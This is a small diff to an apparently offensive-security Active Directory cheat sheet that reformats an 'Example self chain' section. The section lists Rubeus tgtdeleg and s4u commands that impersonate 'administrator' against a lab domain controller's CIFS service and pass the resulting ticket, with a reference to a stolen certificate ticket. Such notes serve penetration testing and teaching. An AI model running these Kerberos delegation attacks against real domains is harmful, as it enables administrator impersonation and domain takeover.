@@ -753,12 +753,14 @@ Rubeus.exe s4u /ticket:CERT_WE_STOLE.kirbi /impersonateuser:user_we_are_imperson
 ```
 
 
-Example:
+#### Example self chain:
 
 ```Rubeus.exe tgtdeleg```
 https://github.com/GhostPack/Rubeus#tgtdeleg
 
-```Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab /dc:dc01.ecorp.lab /ptt```
+```
+Rubeus.exe s4u /ticket: /impersonateuser:administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab /dc:dc01.ecorp.lab /ptt
+```
 
 ```klist```
 
